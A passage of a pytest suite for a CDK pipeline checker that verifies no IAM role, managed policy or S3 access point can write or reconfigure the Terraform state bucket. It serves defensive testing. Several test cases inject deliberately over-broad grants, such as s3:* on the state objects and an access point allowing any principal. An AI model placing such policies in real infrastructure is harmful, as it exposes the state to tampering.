                         _add(res, "MP", "AWS::IAM::ManagedPolicy", {"PolicyDocument": _doc(st)})),
        lambda res, st: (_other_role(res, ManagedPolicyArns=[{"Fn::Sub": "${MP}"}]),
                         _add(res, "MP", "AWS::IAM::ManagedPolicy", {"PolicyDocument": _doc(st)})),
        lambda res, st: _other_role(res, Policies=[{"PolicyName": "p", "PolicyDocument": _doc(
            {"Fn::If": ["C", st, {"Ref": "AWS::NoValue"}]})}]),
        lambda res, st: _other_role(res, Policies=[{"PolicyName": "p", "PolicyDocument": _doc(
            {**st, "Action": {"Fn::If": ["C", "s3:PutObject", "s3:GetObject"]}})}]),
        lambda res, st: _other_role(res, Policies=[{"Fn::If": ["C", {"PolicyName": "p", "PolicyDocument": _doc(st)},
                                                              {"Ref": "AWS::NoValue"}]}]),
    ],
    ids=["role-policy", "user-policy-by-name", "policy-by-role-name", "policy-by-sub", "managed-by-getatt",
         "managed-by-sub", "if-statement", "if-action", "if-inline-policy"],
)
def test_every_way_of_attaching_a_state_write_is_caught(attach):
    def change(res):
        attach(res, _put(_state_object(res)))
    with pytest.raises(AssertionError, match="can write the Terraform state"):
        c.assert_applies_plan(mutated(change), ROOT)


@pytest.mark.parametrize(
    "resource",
    [
        "arn:aws:s3:::demo-tfstate-123456789012-eu-*-an/*",
        "arn:aws:s3:::demo-tfstate-1234*-an/*",
        "arn:aws:s3:::demo-tfstate-12345678901?-us-east-1-an/*",
        "arn:aws-*:s3:::demo-tfstate-*/*",
    ],
)
def test_wildcards_inside_account_or_region_are_caught(resource):
    def change(res):
        _other_role(res, Policies=[{"PolicyName": "p", "PolicyDocument": _doc(_put(resource))}])
    with pytest.raises(AssertionError, match="OtherRole can write the Terraform state"):
        c.assert_applies_plan(mutated(change), ROOT)


@pytest.mark.parametrize("default", [None, "*", "STATE"])
def test_a_parameter_resource_uses_its_default_or_fails_closed(default):
    def change(res):
        _other_role(res, Policies=[{"PolicyName": "p", "PolicyDocument": _doc(
            _put({"Fn::Join": ["", ["arn:aws:s3:::", {"Ref": "Bkt"}, "/*"]]}))}])

    doc = copy.deepcopy(tf_build().to_json())
    change(doc["Resources"])
    param = {"Type": "String"}
    if default is not None:
        param["Default"] = "demo-tfstate-123456789012-us-east-1-an" if default == "STATE" else default
    doc.setdefault("Parameters", {})["Bkt"] = param
    with pytest.raises(AssertionError, match="OtherRole can write the Terraform state"):
        c.assert_applies_plan(Template.from_json(doc), ROOT)


def test_a_parameter_naming_another_bucket_passes():
    doc = copy.deepcopy(tf_build().to_json())
    _other_role(doc["Resources"], Policies=[{"PolicyName": "p", "PolicyDocument": _doc(
        _put({"Fn::Join": ["", ["arn:aws:s3:::", {"Ref": "Bkt"}, "/*"]]}))}])
    doc.setdefault("Parameters", {})["Bkt"] = {"Type": "String", "Default": "site-assets"}
    c.assert_applies_plan(Template.from_json(doc), ROOT)


def test_a_sub_built_post_deploy_resource_is_not_a_false_positive():
    from aws_cdk import Fn
    from test_pipeline import PostDeployStep

    post = PostDeployStep("frontend", ["npm run build"], policy_statements=[iam.PolicyStatement(
        actions=["s3:PutObject"], resources=[Fn.sub("arn:aws:s3:::site-${AWS::AccountId}/*")])])
    t = tf_build(post_deploy=[post])
    c.assert_standard_contract(t, post_deploy=[post], repo=REPO, gates=GATES, terraform=ROOT)


@pytest.mark.parametrize(
    "stmts",
    [
        lambda res: [{"Effect": "Allow", "Action": "s3:*", "NotResource": [
            {"Fn::GetAtt": [_state_lid(res), "Arn"]}, _state_object(res)]}],
        lambda res: [{"Effect": "Allow", "Action": "s3:*", "Resource": "*"},
                     {"Effect": "Deny", "Action": "s3:*", "Resource": _state_object(res)},
                     {"Effect": "Deny", "Action": "s3:*", "Resource": {"Fn::GetAtt": [_state_lid(res), "Arn"]}}],
    ],
    ids=["not-resource-excludes-state", "explicit-deny"],
)
def test_statements_that_exclude_the_state_pass(stmts):
    def change(res):
        _other_role(res, Policies=[{"PolicyName": "p", "PolicyDocument": _doc(*stmts(res))}])
    c.assert_applies_plan(mutated(change), ROOT)


def test_a_wrong_account_not_resource_does_not_hide_a_state_write():
    def change(res):
        _other_role(res, Policies=[{"PolicyName": "p", "PolicyDocument": _doc(
            {"Effect": "Allow", "Action": "s3:*",
             "NotResource": "arn:aws:s3:::demo-tfstate-111111111111-us-east-1-an/*"})}])
    with pytest.raises(AssertionError, match="OtherRole can write the Terraform state"):
        c.assert_applies_plan(mutated(change), ROOT)


@pytest.mark.parametrize("action", ["s3:PutBucketPolicy", "s3:PutLifecycleConfiguration", "s3:PutBucketVersioning"])
def test_no_other_role_may_change_the_state_bucket(action):
    def change(res):
        _role_policy(res, "Plan-main").append(
            {"Effect": "Allow", "Action": action, "Resource": {"Fn::GetAtt": [_state_lid(res), "Arn"]}})
    with pytest.raises(AssertionError, match="can change the Terraform state bucket"):
        c.assert_applies_plan(mutated(change), ROOT)


def test_a_tls_deny_that_skips_the_objects_does_not_count():
    def change(res):
        for st in _bucket_policy_statements(res):
            st["Resource"] = {"Fn::GetAtt": [_state_lid(res), "Arn"]}
    with pytest.raises(AssertionError, match="no TLS-only deny"):
        c.assert_state_bucket(mutated(change), "demo")


def test_an_access_point_that_allows_fails():
    def change(res):
        _add(res, "AP", "AWS::S3::AccessPoint", {"Bucket": {"Ref": _state_lid(res)}, "Policy": _doc(
            {"Effect": "Allow", "Principal": {"AWS": "*"}, "Action": "s3:*", "Resource": "*"})})
    with pytest.raises(AssertionError, match="access point AP"):
        c.assert_state_bucket(mutated(change), "demo")


def test_the_full_contract_survives_a_bare_bucket():
    def change(res):
        res["Bare"] = {"Type": "AWS::S3::Bucket"}
    c.assert_standard_contract(mutated(change), post_deploy=[POST], repo=REPO, gates=GATES, terraform=ROOT)


# --- step 3, round 6: CDK-written managed ARNs, unknowns never excuse, digit account slot -----


def _stack_with(extra):
    """The Terraform pipeline plus whatever ``extra(stack)`` adds, through the public API."""
    import aws_cdk as cdk
    from test_pipeline import CONN, ENV

    from specter_pipeline import StandardPipeline

    app = cdk.App()
    stack = cdk.Stack(app, "PipelineStack", env=ENV)
    StandardPipeline(stack, "P", repo=REPO, connection_arn=CONN, gates=GATES, terraform=ROOT,
                     synth_commands=["cdk -a 'python3 pipeline_app.py' synth"],
                     synth_install=["pip install -r requirements.txt"], post_deploy=[POST])
    extra(stack)
    return Template.from_stack(stack)


def _lambda(stack):
    from aws_cdk import aws_lambda as lambda_

    lambda_.Function(stack, "F", runtime=lambda_.Runtime.PYTHON_3_12, handler="i.h",
                     code=lambda_.Code.from_inline("def h(e, c): pass"))


def _managed_role(stack):
    iam.Role(stack, "R", assumed_by=iam.ServicePrincipal("lambda.amazonaws.com"), managed_policies=[
        iam.ManagedPolicy.from_aws_managed_policy_name("ReadOnlyAccess"),
        iam.ManagedPolicy.from_managed_policy_name(stack, "Mine", "team-policy")])


def _auto_delete(stack):
    import aws_cdk as cdk
    from aws_cdk import aws_s3 as s3

    s3.Bucket(stack, "Site", removal_policy=cdk.RemovalPolicy.DESTROY, auto_delete_objects=True)


def _custom_resource(stack):
    from aws_cdk import custom_resources as cr

    cr.AwsCustomResource(stack, "CR", on_create=cr.AwsSdkCall(
        service="STS", action="getCallerIdentity", physical_resource_id=cr.PhysicalResourceId.of("x")),
        policy=cr.AwsCustomResourcePolicy.from_sdk_calls(resources=cr.AwsCustomResourcePolicy.ANY_RESOURCE))


@pytest.mark.parametrize("extra", [_lambda, _managed_role, _auto_delete, _custom_resource],
                         ids=["lambda", "managed-role", "auto-delete-bucket", "custom-resource"])
def test_ordinary_cdk_constructs_beside_the_pipeline_pass(extra):
    t = _stack_with(extra)
    c.assert_standard_contract(t, post_deploy=[POST], repo=REPO, gates=GATES, terraform=ROOT)


def _queue(res):
    _add(res, "Q", "AWS::SQS::Queue", {})


@pytest.mark.parametrize(
    "stmts",
    [
        lambda res: [{"Effect": "Allow", "Action": "s3:*", "Resource": "*"},
                     {"Effect": "Deny", "Action": "s3:*", "Resource": {"Fn::GetAtt": ["Q", "Arn"]}}],
        lambda res: [{"Effect": "Allow", "Action": "s3:*", "Resource": "*"},
                     {"Effect": "Deny", "Action": "s3:*", "Resource": {"Fn::Sub": "${Q.Arn}"}}],
        lambda res: [{"Effect": "Allow", "Action": "s3:*", "Resource": "*"},
                     {"Effect": "Deny", "Action": "s3:*", "Resource": {"Fn::If": ["C", "*", "x"]}}],
        lambda res: [{"Effect": "Allow", "Action": "s3:*", "Resource": "*"},
                     {"Effect": "Deny", "Action": "s3:*", "Resource": {"Ref": "NoDefault"}}],
        lambda res: [{"Effect": "Allow", "Action": "*", "NotResource": {"Fn::GetAtt": ["Q", "Arn"]}}],
        lambda res: [{"Effect": "Allow", "Action": "*", "NotResource": {"Fn::If": ["C", "*", "x"]}}],
    ],
    ids=["deny-other-resource", "deny-sub", "deny-if", "deny-param", "not-resource-other", "not-resource-if"],
)
def test_an_unreadable_deny_or_not_resource_never_excuses_a_state_write(stmts):
    doc = copy.deepcopy(tf_build().to_json())
    res = doc["Resources"]
    _queue(res)
    _other_role(res, Policies=[{"PolicyName": "p", "PolicyDocument": _doc(*stmts(res))}])
    doc.setdefault("Parameters", {})["NoDefault"] = {"Type": "String"}
    with pytest.raises(AssertionError, match="OtherRole can"):
        c.assert_applies_plan(Template.from_json(doc), ROOT)


def test_a_deny_in_an_unrelated_managed_policy_is_not_borrowed():
    def change(res):
        _add(res, "DenyAll", "AWS::IAM::ManagedPolicy", {"PolicyDocument": _doc(
            {"Effect": "Deny", "Action": "s3:*", "Resource": "*"})})
        _other_role(res, ManagedPolicyArns=[{"Fn::ImportValue": "SomePolicyArn"}],
                    Policies=[{"PolicyName": "p", "PolicyDocument": _doc(_put(_state_object(res)))}])
    with pytest.raises(AssertionError, match="OtherRole can write the Terraform state"):
        c.assert_applies_plan(mutated(change), ROOT)


def test_an_account_prefixed_bucket_is_not_the_state_bucket():
    def change(res):
        _other_role(res, Policies=[{"PolicyName": "p", "PolicyDocument": _doc(_put(
            {"Fn::Join": ["", ["arn:aws:s3:::", {"Ref": "AWS::AccountId"}, "-site/*"]]}))}])
    c.assert_applies_plan(mutated(change), ROOT)


def test_an_ssm_parameter_is_read_as_unknown():
    doc = copy.deepcopy(tf_build().to_json())
    _other_role(doc["Resources"], Policies=[{"PolicyName": "p", "PolicyDocument": _doc(_put({"Ref": "X"}))}])
    doc.setdefault("Parameters", {})["X"] = {"Type": "AWS::SSM::Parameter::Value<String>",
                                             "Default": "/config/bucket-arn"}
    with pytest.raises(AssertionError, match="OtherRole can write the Terraform state"):
        c.assert_applies_plan(Template.from_json(doc), ROOT)


# --- step 3 follow-ups from PR #6's last verification (P1-P4) ----------------------------------


def test_a_managed_policy_from_another_stack_is_external():
    import aws_cdk as cdk
    from test_pipeline import ENV

    def extra(stack):
        other = cdk.Stack(stack.node.root, "Shared", env=ENV)
        mp = iam.ManagedPolicy(other, "MP", statements=[iam.PolicyStatement(
            actions=["sqs:SendMessage"], resources=["*"])])
        iam.Role(stack, "R", assumed_by=iam.ServicePrincipal("lambda.amazonaws.com"), managed_policies=[mp])
    t = _stack_with(extra)
    c.assert_standard_contract(t, post_deploy=[POST], repo=REPO, gates=GATES, terraform=ROOT)


def test_a_policy_on_an_existing_bucket_named_outright_passes():
    from aws_cdk import aws_s3 as s3

    def extra(stack):
        b = s3.Bucket.from_bucket_name(stack, "Site", "my-existing-site")
        pol = s3.BucketPolicy(stack, "SitePolicy", bucket=b)
        pol.document.add_statements(iam.PolicyStatement(
            actions=["s3:GetObject"], resources=["arn:aws:s3:::my-existing-site/*"],
            principals=[iam.ServicePrincipal("cloudfront.amazonaws.com")]))
    c.assert_state_bucket(_stack_with(extra), "demo")


@pytest.mark.parametrize("arn", ["arn:aws:iam::000000000000:policy/state-writer",
                                 {"Fn::Join": ["", ["arn:aws:iam::", {"Ref": "AWS::AccountId"},
                                                    ":policy/state-writer"]]}])
def test_a_template_managed_policy_named_by_arn_is_read(arn):
    def change(res):
        _add(res, "MP", "AWS::IAM::ManagedPolicy", {"ManagedPolicyName": "state-writer",
                                                    "PolicyDocument": _doc(_put(_state_object(res)))})
        _other_role(res, ManagedPolicyArns=[arn])
    with pytest.raises(AssertionError, match="OtherRole can write the Terraform state"):
        c.assert_applies_plan(mutated(change), ROOT)


def test_a_deny_on_a_parameter_never_excuses_even_with_a_star_default():
    doc = copy.deepcopy(tf_build().to_json())
    _other_role(doc["Resources"], Policies=[{"PolicyName": "p", "PolicyDocument": _doc(
        {"Effect": "Allow", "Action": "s3:*", "Resource": "*"},
        {"Effect": "Deny", "Action": "s3:*", "Resource": {"Ref": "P"}})}])
    doc.setdefault("Parameters", {})["P"] = {"Type": "String", "Default": "*"}
    with pytest.raises(AssertionError, match="OtherRole can"):
        c.assert_applies_plan(Template.from_json(doc), ROOT)


# --- PR #7 review: P3 by-name matching -------------------------------------------------------


def test_an_aws_managed_arn_never_borrows_a_template_policy_of_the_same_name():
    def change(res):
        _add(res, "MP", "AWS::IAM::ManagedPolicy", {"ManagedPolicyName": "ReadOnlyAccess",
                                                    "PolicyDocument": _doc({"Effect": "Deny", "Action": "s3:*", "Resource": "*"})})
        _other_role(res, ManagedPolicyArns=["arn:aws:iam::aws:policy/ReadOnlyAccess"],
                    Policies=[{"PolicyName": "p", "PolicyDocument": _doc(_put(_state_object(res)))}])
    with pytest.raises(AssertionError, match="OtherRole can write the Terraform state"):
        c.assert_applies_plan(mutated(change), ROOT)


def test_an_aws_managed_arn_is_not_a_template_policy_that_writes_state():
    def change(res):
        _add(res, "MP", "AWS::IAM::ManagedPolicy", {"ManagedPolicyName": "ReadOnlyAccess",
                                                    "PolicyDocument": _doc(_put(_state_object(res)))})
        _other_role(res, ManagedPolicyArns=["arn:aws:iam::aws:policy/ReadOnlyAccess"])
    # MP itself is attached to nobody, so it reaches no principal
    c.assert_applies_plan(mutated(change), ROOT)


@pytest.mark.parametrize("name", [{"Fn::Sub": "state-writer"},
                                  {"Fn::Join": ["-", ["state-writer", {"Ref": "AWS::Region"}]]},
                                  {"Ref": "PolicyName"}])
def test_a_non_literal_managed_policy_name_is_still_matched(name):
    doc = copy.deepcopy(tf_build().to_json())
    res = doc["Resources"]
    _add(res, "MP", "AWS::IAM::ManagedPolicy", {"ManagedPolicyName": name,
                                                "PolicyDocument": _doc(_put(_state_object(res)))})
    _other_role(res, ManagedPolicyArns=["arn:aws:iam::000000000000:policy/state-writer-us-east-1"
                                        if "Fn::Join" in name else "arn:aws:iam::000000000000:policy/state-writer"])
    doc.setdefault("Parameters", {})["PolicyName"] = {"Type": "String", "Default": "state-writer"}
    with pytest.raises(AssertionError, match="OtherRole can write the Terraform state"):
        c.assert_applies_plan(Template.from_json(doc), ROOT)
